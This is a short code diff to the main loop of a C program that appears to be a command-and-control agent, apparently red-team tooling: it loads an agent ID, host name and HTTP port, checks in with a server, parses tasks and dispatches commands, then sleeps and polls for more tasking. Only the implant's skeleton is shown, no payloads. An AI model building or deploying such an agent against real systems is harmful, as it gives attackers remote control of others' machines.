@@ -3,7 +3,7 @@
 
 CONFIG_CORN corn_config = {0}; // initial
 
-int SetupAgentConfig(void){
+int setupAgentConfig(void){
     corn_config.AgentID = (PCHAR)initUUID;
     corn_config.HostName = (PWCHAR)hostname;
     corn_config.HttpPort = (DWORD)httpport;
@@ -17,18 +17,19 @@ int SetupAgentConfig(void){
 }
 
 int main(void){
-    SetupAgentConfig();
+    // TODO コールバックuuidの登録
+    PParser initTask = sendCheckin();
+    PCommand cmd = tlvReadField(initTask);
+    dispatchCommand(cmd);
 
-    // prototype
-    sendChekin();
+    // first sleep
+    sleep(corn_config.SleepTime);
 
-
-    sleep(10);
 
     PPackage prevResults = NULL;
-    // command roop
+    // command loop
     while(TRUE){
-        PPackage package = newPackage(TRUE);
+        PPackage package = newPackage(TRUE, get_tasking);
 
         if(prevResults != NULL){
         addBytes(package, prevResults->buffer, prevResults->size);
@@ -44,7 +45,7 @@ int main(void){
         continue;
         }
 
-        prevResults = newPackage(FALSE);
+        prevResults = newPackage(FALSE, get_tasking);
 
         BYTE taskCount = getTaskCount(parser);
         for(BYTE i = 0; i < taskCount; i++){
